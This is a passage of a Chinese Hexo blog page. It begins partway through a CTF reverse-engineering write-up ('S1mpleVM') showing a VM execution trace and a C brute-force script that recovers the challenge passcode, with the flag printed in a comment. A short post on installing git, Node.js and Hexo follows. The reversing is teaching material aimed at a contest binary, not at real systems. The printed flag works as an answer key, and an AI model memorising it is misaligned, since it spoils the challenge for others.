class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">calc 137+71=208</span><br><span class="line">push val 208</span><br><span class="line">calc 208+39=247</span><br><span class="line">push val 247</span><br><span class="line">calc 247+120=367</span><br><span class="line">push val 367</span><br><span class="line">calc 367+22=389</span><br><span class="line">push val 389</span><br><span class="line">calc 389+119=508</span><br><span class="line">push val 508</span><br><span class="line">calc 508+89=597</span><br><span class="line">push val 597</span><br><span class="line">calc 597+22=619</span><br><span class="line">push val 619</span><br><span class="line">calc 619+218=837</span><br><span class="line">push val 837</span><br><span class="line">calc 837+203=1040</span><br><span class="line">push val 1040</span><br><span class="line">calc 1040+125=1165</span><br><span class="line">push val 1165</span><br><span class="line">calc 1165+125=1290</span><br><span class="line">push val 1290</span><br><span class="line">calc 1290+5=1295</span><br><span class="line">push val 1295</span><br><span class="line">calc 1295+118=1413</span><br><span class="line">push val 1413</span><br><span class="line">calc 1413+30=1443</span><br><span class="line">push val 1443</span><br><span class="line">calc 1443+59=1502</span><br><span class="line">push val 1502</span><br><span class="line">calc 1502+89=1591</span><br><span class="line">push val 1591</span><br><span class="line">calc 1591+213=1804</span><br><span class="line">push val 1804</span><br><span class="line">calc 1804+114=1918</span><br><span class="line">push val 1918</span><br><span class="line">calc 1918+35=1953</span><br><span class="line">push val 1953</span><br><span class="line">calc 1953+18=1971</span><br><span class="line">push val 1971</span><br><span class="line">calc 1971+18=1989</span><br><span class="line">push val 1989</span><br><span class="line">calc 1989+121=2110</span><br><span class="line">push val 2110</span><br><span class="line">calc 2110+65=2175</span><br><span class="line">push val 2175</span><br><span class="line">calc 2175+32=2207</span><br><span class="line">push val 2207</span><br><span class="line">calc 2207+221=2428</span><br><span class="line">push val 2428</span><br><span class="line">calc 2428+253=2681</span><br><span class="line">push val 2681</span><br><span class="line">calc 2681+348=3029</span><br><span class="line">push val 3029</span><br><span class="line">calc 3029+130=3159</span><br><span class="line">push val 3159</span><br><span class="line">calc 3159+92=3251</span><br><span class="line">push val 3251</span><br><span class="line">calc 3251+140=3391</span><br><span class="line">push val 3391</span><br><span class="line">calc 3391+24=3415</span><br><span class="line">push val 3415</span><br><span class="line">pop 3415 to reg1</span><br><span class="line">retval=3415</span><br></pre></td></tr></table></figure>

<p>计算的第一个异或值，在最后被加起来返回了。</p>
<p>最终根据逻辑，写出还原 passcode 的逻辑。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">char v[]=&#123;</span><br><span class="line">2,3,67,37,41,11,13,89,2,3,67,5,7,47,61,29,2,67,37,7,43,11,13,31,97,3,41,73,11,13,53,29,97,67,3,11,43,13,47,83,67,5,37,71,7,11,89,29,2,3,5,11,13,83,53,61,2,3,7,71,43,83,29,31,7,73,11,13,53,89,29,31,2,3,5,37,7,43,13,61,2,5,7,43,11,13,53,89,5,7,73,43,11,13,59,31,3,5,73,41,43,13,83,89,2,7,71,11,43,13,29,61,2,5,7,11,13,79,47,83,3,67,37,5,73,11,13,61,2,67,5,7,71,11,13,61,67,3,5,37,43,11,13,61,2,3,37,7,71,41,11,29,3,5,41,11,43,47,53,29,2,3,7,71,43,13,47,79,2,3,5,37,11,43,13,79,97,67,5,37,7,41,11,61,3,71,7,43,11,79,53,61,2,3,71,73,11,13,61,31,97,2,3,67,5,11,13,83,2,3,5,37,7,41,11,53,2,3,73,43,11,13,53,61,2,67,3,37,7,11,47,59,2,37,5,73,13,47,53,59,2,67,71,73,41,11,13,89,2,3,67,37,73,11,43,59,&#125;;</span><br><span class="line">char target[]=&#123;70,56,70,77,74,90,87,82,60,67,86,95,64,94,85,66,33,69,64,98,67,71,94,93,90,32,65,82,68,65,93,96,&#125;;</span><br><span class="line">int checkval(int i,int pos)&#123;</span><br><span class="line">	int sum=0;</span><br><span class="line">	for(int j=0;j&lt;8;j++)&#123;</span><br><span class="line">		sum+=((i&gt;&gt;j)&amp;1)*v[j+pos*8];</span><br><span class="line">	&#125;</span><br><span class="line">	return sum;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	for(size_t i=0;i&lt;sizeof(target);i++)&#123;</span><br><span class="line">		for(int j=0x20;j&lt;127;j++)&#123;</span><br><span class="line">			if(target[i]==checkval(j,i))&#123;</span><br><span class="line">				putchar(j);</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">//s1mpl3_VM_us3s_link3d_l1st_st4ck</span><br></pre></td></tr></table></figure>

<style>.wddjxumsrnbg{zoom:80%;}</style><img src="/2024/11/17/S1mpleVM/image-20251107213047428.png" class="wddjxumsrnbg" alt="image-20251107213047428">

<p>输入得到flag</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/11/17/S1mpleVM/" data-id="cuidrYGxsG84V-ZbXrAA45G9N" data-title="S1mpleVM" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hello" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/11/17/hello/" class="article-date">
  <time class="dt-published" datetime="2023-11-17T07:08:30.000Z" itemprop="datePublished">2023-11-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/11/17/hello/">hello</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="安装git和nodejs"><a href="#安装git和nodejs" class="headerlink" title="安装git和nodejs"></a>安装git和nodejs</h2><p>官方下载地址: <a href="https://link.zhihu.com/?target=https://git-scm.com/download/win">Git - Downloading Package (git-scm.com)</a></p>
<p>官方下载地址: <a href="https://link.zhihu.com/?target=https://nodejs.org/en/">Node.js (nodejs.org)</a></p>
<p>在 cmd 中输入命令 <code>git --version</code>, 查看 Git 版本</p>
<p>在 cmd 中输入命令 <code>node -v</code>, 查看 Node 版本</p>
<h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><p>使用 cnpm 安装 Hexo，先通过 npm install 安装 cnpm。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry==https://registry.npm.taobao.org</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 cmd 中输入命令 cnpm -v, 可查看 cnpm 版本</span></span><br><span class="line">cnpm install -g hexo-cli</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 cmd 中输入命令 hexo -v, 可查看 hexo 版本</span></span><br></pre></td></tr></table></figure>





<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>hjkkgktest</p>
<p><img src="/2023/11/17/hello/wallhaven-rq75r7.jpg" alt="wallhaven-rq75r7"></p>
<p>et2<img src="/2023/11/17/hello/wallhaven-2yg1lg.png" alt="wallhaven-2yg1lg"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/11/17/hello/" data-id="cuidP-WXZQZxDwbRQArr7w28Y" data-title="hello" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">November 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">August 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/11/18/n1ctfjunior-re/">n1ctfjunior-re</a>
          </li>
        
          <li>
            <a href="/2025/11/01/qwb2025-re/">qwb2025-re</a>
          </li>
        
          <li>
            <a href="/2025/10/25/qwb2025-pwn/">qwb2025-pwn flagmarket</a>
          </li>
        
          <li>
            <a href="/2025/10/10/junior/">n1ctf junior 2/2 web</a>
          </li>
        
          <li>
            <a href="/2025/09/16/n1ctf-pwn/">n1ctf2025_pwn</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 xrivendell7<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>